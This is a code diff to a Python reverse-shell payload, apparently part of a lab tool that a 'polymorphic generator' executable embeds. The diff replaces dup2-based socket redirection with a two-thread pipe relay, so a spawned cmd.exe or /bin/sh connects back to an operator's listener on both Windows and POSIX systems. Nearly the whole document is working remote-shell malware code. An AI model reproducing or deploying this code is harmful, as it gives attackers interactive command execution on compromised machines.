@@ -19,6 +19,14 @@ The polymorphic generator embeds this file and executes it, forwarding the
 generated program's own arguments:
 
     ./polymorphic.exe --host 192.168.56.101 --port 4444
+
+Portability
+-----------
+The shell is wired to the socket by **relaying bytes through pipes with two
+threads**, not with ``os.dup2(sock, 0/1/2)``. The ``dup2`` trick is POSIX-only:
+on Windows a socket handle is not a low file descriptor, so ``dup2`` fails with
+``OSError: [Errno 9] Bad file descriptor``. The pipe relay works the same way on
+Windows (``cmd.exe``) and Linux/macOS (``/bin/sh``).
 """
 
 import argparse
@@ -26,6 +34,7 @@ import os
 import socket
 import subprocess
 import sys
+import threading
 
 
 def build_parser() -> argparse.ArgumentParser:
@@ -47,13 +56,40 @@ def build_parser() -> argparse.ArgumentParser:
     return parser
 
 
+def _socket_to_shell(connection: socket.socket, stdin_fd: int) -> None:
+    """Forward bytes the listener sends into the shell's standard input."""
+    try:
+        while True:
+            data = connection.recv(4096)
+            if not data:
+                break
+            os.write(stdin_fd, data)
+    except OSError:
+        pass
+    finally:
+        try:
+            os.close(stdin_fd)
+        except OSError:
+            pass
+
+
+def _shell_to_socket(stdout_fd: int, connection: socket.socket) -> None:
+    """Forward the shell's output (and errors) back to the listener."""
+    try:
+        while True:
+            data = os.read(stdout_fd, 4096)
+            if not data:
+                break
+            connection.sendall(data)
+    except OSError:
+        pass
+
+
 def main() -> int:
     args = build_parser().parse_args()
 
-    if os.name == "nt":
-        shell = ["cmd.exe"]
-    else:
-        shell = ["/bin/sh", "-i"]
+    # An interactive shell per platform. cmd.exe on Windows; /bin/sh on POSIX.
+    shell = ["cmd.exe"] if os.name == "nt" else ["/bin/sh", "-i"]
 
     print(
         f"[INFO] Reverse shell initialized. Connecting to {args.host}:{args.port}..."
@@ -71,14 +107,46 @@ def main() -> int:
 
     print("[INFO] Connected. Starting shell.")
 
-    # Hand the socket to the shell as stdin, stdout and stderr.
-    os.dup2(connection.fileno(), 0)
-    os.dup2(connection.fileno(), 1)
-    os.dup2(connection.fileno(), 2)
+    # Give the shell its own pipes, then relay those pipes to/from the socket.
+    # bufsize=0 keeps the pipes unbuffered so output reaches the listener
+    # immediately instead of waiting for a full buffer.
+    try:
+        process = subprocess.Popen(  # noqa: S602 - lab payload, fixed shell
+            shell,
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            bufsize=0,
+        )
+    except OSError as exc:
+        print(f"[ERROR] Could not start the shell: {exc}", file=sys.stderr)
+        connection.close()
+        return 1
 
-    subprocess.call(shell)  # noqa: S602 - lab payload, operator-supplied shell
+    reader = threading.Thread(
+        target=_socket_to_shell,
+        args=(connection, process.stdin.fileno()),
+        daemon=True,
+    )
+    writer = threading.Thread(
+        target=_shell_to_socket,
+        args=(process.stdout.fileno(), connection),
+        daemon=True,
+    )
+    reader.start()
+    writer.start()
 
-    return 0
+    # Wait for the shell to exit (for example the operator types ``exit``),
+    # then tear the connection down so the relay threads unblock.
+    returncode = process.wait()
+    writer.join(timeout=5)
+    try:
+        connection.shutdown(socket.SHUT_RDWR)
+    except OSError:
+        pass
+    connection.close()
+
+    return returncode
 
 
 if __name__ == "__main__":
